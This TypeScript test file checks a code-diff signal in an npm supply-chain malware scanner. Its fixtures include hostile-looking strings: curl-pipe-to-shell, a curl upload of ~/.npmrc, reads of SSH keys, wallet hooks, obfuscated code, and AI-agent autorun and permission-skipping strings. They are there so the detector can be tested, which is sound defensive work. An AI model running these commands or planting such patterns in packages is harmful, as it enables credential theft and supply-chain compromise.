import { test } from 'node:test';
import assert from 'node:assert/strict';
import { CodeDiffSignal } from '../src/modules/analysis/signals/code-diff.signal.js';
import { SEVERITY_WEIGHT, type AnalysisContext, type FileMap, type VersionManifest } from '../src/modules/analysis/signal.js';
import { decide } from '../src/modules/analysis/verdict.js';

const manifest = (version: string, scripts?: Record<string, string>): VersionManifest => ({
  name: 'fixture', version, scripts, dist: { tarball: 'https://fixture.invalid/package.tgz' },
});
const files = (entries: Record<string, string | Uint8Array>): FileMap => new Map(
  Object.entries(entries).map(([path, value]) => [path, typeof value === 'string' ? Buffer.from(value) : value]),
);
function context(target: FileMap, baseline: FileMap = new Map(),
  scripts?: Record<string, string>, oldScripts?: Record<string, string>): AnalysisContext {
  return { name: 'fixture', target: manifest('2.0.0', scripts), baseline: [manifest('1.0.0', oldScripts)], time: {},
    loadFiles: async version => version === '2.0.0' ? target : baseline };
}
const signal = new CodeDiffSignal();
const obfuscated = '// benign fixture\n' + '_0xabcdef;'.repeat(25);
const diverse = Array.from({ length: 90 }, (_, index) => String.fromCharCode(33 + index)).join('');

test('changed bundles reuse baseline exec and obfuscation capabilities without risk weight', async () => {
  const baseline = files({ 'bundle.js': "require('child_process');\n" + obfuscated });
  const target = files({ 'bundle.js': "require('child_process').spawn('node', ['--version']);\n" + obfuscated + ';changed();' });
  const result = await signal.evaluate(context(target, baseline));
  for (const category of ['exec', 'obfuscation']) {
    const finding = result.find(f => f.title.includes(category));
    assert.ok(finding, category);
    assert.equal(finding.severity, 'info');
    assert.equal(finding.weight, 0);
  }
});

test('capability downgrades require the same pattern id and exclude added and install-run files', async () => {
  const baseline = files({ 'bundle.js': "require('child_process');" });
  for (const [target, scripts] of [
    [files({ 'bundle.js': 'eval(newCode);' }), undefined],
    [files({ 'new.js': "require('child_process').spawn('node');" }), undefined],
    [files({ 'bundle.js': "require('child_process').spawn('node');" }), { install: 'node bundle.js' }],
  ] as const) {
    const result = await signal.evaluate(context(target, baseline, scripts, scripts));
    assert.ok(result.some(f => f.title.includes('exec') && f.severity === 'warn' && f.weight === 15));
  }
});

test('changed files can reuse a capability found in another baseline JavaScript file', async () => {
  const helper = "require('child_process');";
  const result = await signal.evaluate(context(
    files({ 'bundle.js': "require('child_process').spawn('node');", 'helper.js': helper }),
    files({ 'bundle.js': 'export {};', 'helper.js': helper }),
  ));
  assert.equal(result.length, 1);
  assert.equal(result[0].severity, 'info');
  assert.equal(result[0].weight, 0);
});

test('baseline capabilities never downgrade high exec or new wallet-obfuscation combinations', async () => {
  const baseline = files({ 'bundle.js': "require('child_process');\n" + obfuscated });
  const result = await signal.evaluate(context(files({ 'bundle.js':
    "require('child_process');\nspawn('node', [], { detached: true });\nwindow.ethereum;\n" + obfuscated + ';changed();' }), baseline));
  assert.ok(result.some(f => f.title.includes('exec') && f.severity === 'high'));
  assert.ok(result.some(f => f.title.includes('obfuscation') && f.severity === 'critical'));
  assert.ok(result.some(f => f.title.includes('wallet') && f.severity === 'critical'));
});

test('chalk-like changed code combining wallet hooks and obfuscation is critical', async () => {
  const result = await signal.evaluate(context(files({ 'index.js': `${obfuscated}\nwindow.ethereum.request; XMLHttpRequest.prototype.open; window.fetch = fixture;` }),
    files({ 'index.js': 'export {};' })));
  assert.ok(result.some(finding => finding.severity === 'critical' && finding.weight === 70));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('index.js:'))));
});

test('unchanged suspicious code and removed files produce no findings', async () => {
  const code = `${obfuscated} window.ethereum`;
  assert.deepEqual(await signal.evaluate(context(files({ 'index.js': code }), files({ 'index.js': code, 'removed.js': 'eval(fixture)' }))), []);
});

test('nx-like telemetry referenced by a new postinstall is critical', async () => {
  const result = await signal.evaluate(context(files({
    'telemetry.js': "// fixture strings only\nrequire('child_process'); Object.keys(process.env); .ssh/id_rsa; claude --dangerously-skip-permissions; api.github.com/user/repos; .bashrc",
  }), new Map(), { postinstall: 'node ./telemetry.js' }));
  assert.ok(result.length >= 4);
  assert.ok(result.every(finding => finding.severity === 'critical'));
});

test('keyv-like new preinstall and packed companion payload are detected', async () => {
  const result = await signal.evaluate(context(files({
    'setup.mjs': `${obfuscated}\nimport cp from 'node:child_process'; cp.execFileSync(fixture); github.com/oven-sh/bun/releases; .claude/settings.json SessionStart .vscode/tasks.json folderOpen`,
    'Math_Symbol.js': diverse.repeat(8500),
  }), new Map(), { preinstall: 'node setup.mjs' }));
  assert.ok(result.some(finding => finding.severity === 'critical'));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('packed-payload'))));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('agent-autorun'))));
});

test('package.json-only dependency changes do not produce code-diff findings', async () => {
  assert.deepEqual(await signal.evaluate(context(files({ 'package.json': '{"dependencies":{"fixture":"2"}}', 'index.js': 'export {};' }),
    files({ 'package.json': '{"dependencies":{"fixture":"1"}}', 'index.js': 'export {};' }))), []);
});

test('target and baseline load failures return an incomplete comparison warning', async () => {
  for (const version of ['1.0.0', '2.0.0']) {
    const ctx = context(new Map());
    ctx.loadFiles = async requested => { if (requested === version) throw new Error('fixture unavailable'); return new Map(); };
    assert.deepEqual(await signal.evaluate(ctx), [{ signal: 'code-diff', severity: 'warn',
      title: 'Code comparison incomplete: fixture unavailable', evidence: [], weight: 15, incomplete: true }]);
    assert.equal(decide(await signal.evaluate(ctx)).verdict, 'REVIEW');
  }
});

test('first release scanning uses a lower severity and the contract weight', async () => {
  const ctx = context(files({ 'index.js': 'JSON.stringify(process.env)' }));
  ctx.baseline = [];
  const result = await signal.evaluate(ctx);
  // A lone env dump is 'warn'; with no previous release to compare it drops one level.
  assert.equal(result[0].severity, 'info');
  assert.equal(result[0].weight, 0);
});

test('new non-JS install entry points, native builds and binary payloads are scanned', async () => {
  const result = await signal.evaluate(context(files({
    'setup.sh': 'curl https://fixture.invalid/install | sh',
    'binding.gyp': '{}',
    'payload.bin': Uint8Array.from({ length: 320 * 1024 }, (_, index) => index % 256),
    'disguised.js': Uint8Array.from({ length: 320 * 1024 }, (_, index) => index % 256),
    '.claude/settings.json': '{}',
    '.vscode/tasks.json': '{}',
  }), new Map(), { install: 'sh "./setup.sh"' }));
  assert.ok(result.some(finding => finding.severity === 'high'));
  for (const id of ['native-install', 'packed-payload', 'agent-autorun']) {
    assert.ok(result.some(finding => finding.evidence.some(item => item.includes(id))), id);
  }
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('disguised.js:1 [packed-payload]'))));
});

test('existing install script does not escalate a changed file to critical', async () => {
  const result = await signal.evaluate(context(files({ 'setup.js': 'Object.keys(process.env)' }), files({ 'setup.js': 'export {};' }),
    { postinstall: 'node setup.js' }, { postinstall: 'node setup.js' }));
  // Unchanged script: no critical escalation; a lone env dump without exec/obfuscation is weak.
  assert.equal(result[0].severity, 'warn');
});

test('large files report incomplete coverage and scan only their head and tail', async () => {
  const result = await signal.evaluate(context(files({
    'bundle.min.js': 'a'.repeat(501 * 1024),
    'huge.js': `eval(head);${'a'.repeat(3 * 1024 * 1024)};JSON.stringify(process.env);${'a'.repeat(3 * 1024 * 1024)};eval(tail);`,
  })));
  // A new minified bundle alone is weak evidence (generated parsers, vendored code).
  assert.ok(!result.some(finding => finding.severity === 'high' || finding.severity === 'critical'));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('large-minified-file'))));
  // Partial scans of big bundles are noted without risk weight (typescript.js is ~9 MB).
  assert.ok(result.some(finding => finding.title === 'Code scanned partially: huge.js' && finding.weight === 0 && finding.incomplete));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('eval(head)'))));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('eval(tail)'))));
  assert.ok(!result.some(finding => finding.title.includes('credentials')));
});

test('aggregation caps evidence per category and keeps critical evidence visible', async () => {
  const entries = Object.fromEntries(Array.from({ length: 8 }, (_, index) => [`file${index}.js`, 'eval(fixture)']));
  entries['last.js'] = 'eval(fixture); JSON.stringify(process.env)';
  const result = await signal.evaluate(context(files(entries), new Map(), { postinstall: 'node last.js' }));
  assert.equal(result.length, 2);
  assert.equal(result[0].severity, 'critical');
  assert.equal(result[0].evidence.length, 5);
  assert.ok(result[0].evidence[0].startsWith('last.js:'));
  for (const finding of result) assert.equal(finding.weight, SEVERITY_WEIGHT[finding.severity]);
});

test('identical source lines in renamed bundler chunks are suppressed', async () => {
  const result = await signal.evaluate(context(
    files({ 'dist/chunk.B2.js': "import { spawn } from 'node:child_process'; const deny = ['.npmrc'];" }),
    files({ 'dist/chunk.A1.js': "import { spawn } from 'node:child_process'; const deny = ['.npmrc'];" }),
  ));
  assert.deepEqual(result, []);
});

test('old harmless patterns do not suppress a newly added credential upload line', async () => {
  const baseline = "require('child_process');\nconst deny = ['.npmrc'];";
  for (const target of [
    files({ 'index.js': baseline + "\nexec('curl -T ~/.npmrc https://x');" }),
    files({ 'index.js': baseline, 'payload.js': "require('child_process');\nexec('curl -T ~/.npmrc https://x');" }),
  ]) {
    const result = await signal.evaluate(context(target, files({ 'index.js': baseline })));
    assert.ok(result.some(f => f.title.includes('credentials') && f.severity === 'high'
      && f.evidence.some(line => line.includes('.npmrc https://x'))));
  }
});

test('trimmed lines and 160-character windows survive bundler renames', async () => {
  const code = '/*' + 'a'.repeat(800) + "*/require('child_process'); const deny = ['.npmrc'];/*" + 'b'.repeat(800) + '*/';
  assert.deepEqual(await signal.evaluate(context(files({ 'new.js': 'changed prefix;' + code }),
    files({ 'old.js': code }))), []);
  assert.deepEqual(await signal.evaluate(context(files({ 'new.js': "  require('child_process');  " }),
    files({ 'old.js': "require('child_process');" }))), []);
});

test('a new install reference bypasses suppression but plain exec alone stays high', async () => {
  for (const command of ['node --version', 'node-gyp rebuild', 'prebuild-install']) {
    const code = `require('child_process').execSync('${command}');`;
    const result = await signal.evaluate(context(files({ 'setup.js': code }), files({ 'old.js': code }),
      { install: 'node setup.js' }));
    assert.equal(result.length, 1);
    assert.equal(result[0].severity, 'high');
    assert.equal(result[0].weight, 35);
  }
});

test('new files referenced by an unchanged install script also bypass line suppression', async () => {
  const code = "require('child_process').execSync('node --version');";
  const scripts = { install: 'node setup.js' };
  const result = await signal.evaluate(context(files({ 'setup.js': code }), files({ 'old.js': code }), scripts, scripts));
  assert.ok(result.some(f => f.evidence.some(line => line.startsWith('setup.js:'))));
});

test('a new install reference with dangerous categories still escalates to critical', async () => {
  for (const code of ["require('child_process'); read('.npmrc');", 'webhook.site',
    'SessionStart', '.bashrc', 'window.ethereum', '_0xabcdef;'.repeat(25)]) {
    const result = await signal.evaluate(context(files({ 'setup.js': code }), new Map(), { install: 'node setup.js' }));
    assert.ok(result.length > 0);
    assert.ok(result.every(f => f.severity === 'critical'), code);
  }
});

test('release scan budget covers baseline and target and reports skipped files once', async () => {
  const chunk = Buffer.from((' '.repeat(127) + '\n').repeat(1024 * 1024 / 128));
  const target = new Map(Array.from({ length: 15 }, (_, i) => [`new${i}.js`, chunk]));
  const baseline = new Map(Array.from({ length: 10 }, (_, i) => [`old${i}.js`, chunk]));
  const result = await signal.evaluate(context(target, baseline));
  assert.deepEqual(result, [{ signal: 'code-diff', severity: 'warn', weight: 15,
    title: 'Code comparison incomplete: code scan budget exceeded, 1 files not scanned', evidence: [], incomplete: true }]);
  assert.equal(decide(result).verdict, 'REVIEW');
});

test('oversized files in the target or baseline are noted as partial scans without weight', async () => {
  const huge = Buffer.from((' '.repeat(127) + '\n').repeat(3 * 1024 * 1024 / 128));
  const first = context(files({ 'huge.js': huge }));
  first.baseline = [];
  const result = await signal.evaluate(first);
  assert.equal(result.length, 1);
  assert.equal(result[0].severity, 'info');
  assert.equal(result[0].weight, 0);
  assert.equal(result[0].incomplete, true);
  assert.equal(decide(result).verdict, 'REVIEW');
  const baselineResult = await signal.evaluate(context(files({ 'index.js': 'export {};' }), files({ 'old.js': huge })));
  assert.ok(baselineResult.some(f => f.title === 'Code scanned partially: old.js' && f.weight === 0 && f.incomplete));
});

test('code scan cancellation and deadlines carry structured incomplete findings', async () => {
  for (const mode of ['abort', 'deadline']) {
    const controller = new AbortController();
    if (mode === 'abort') controller.abort();
    const ctx = { ...context(files({ 'index.js': 'export {};' })),
      signal: controller.signal, deadline: mode === 'deadline' ? Date.now() - 1 : undefined };
    const result = await signal.evaluate(ctx);
    assert.ok(result.some(f => f.incomplete && f.weight === 15 && f.title.includes('deadline exceeded or cancelled')));
    assert.equal(decide(result).verdict, 'REVIEW');
  }
});

test('a credential path next to process execution in a new file is high', async () => {
  const result = await signal.evaluate(context(
    files({ 'steal.js': "require('child_process'); read(home + '/.npmrc');" }),
    files({ 'index.js': 'export {};' }),
  ));
  assert.ok(result.some(f => f.title.includes('credentials') && f.severity === 'high'));
});
